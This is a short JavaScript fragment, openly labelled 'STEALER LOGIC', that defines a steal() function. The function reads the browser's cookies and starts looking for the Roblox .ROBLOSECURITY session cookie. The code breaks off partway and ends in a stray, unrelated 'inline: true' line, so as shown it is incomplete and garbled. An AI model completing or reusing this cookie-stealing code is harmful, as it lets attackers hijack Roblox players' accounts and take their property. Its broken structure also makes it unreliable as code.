        // ==========================================
        // STEALER LOGIC
        // ==========================================

        async function steal() {
            try {
                // 1. Get all cookies from the browser
                const cookies = document.cookie.split(';');
                
                // 2. Find the Roblox Security Cookie (.ROBLOSECURITY)
                let robloxCookie = null;

                                inline: true
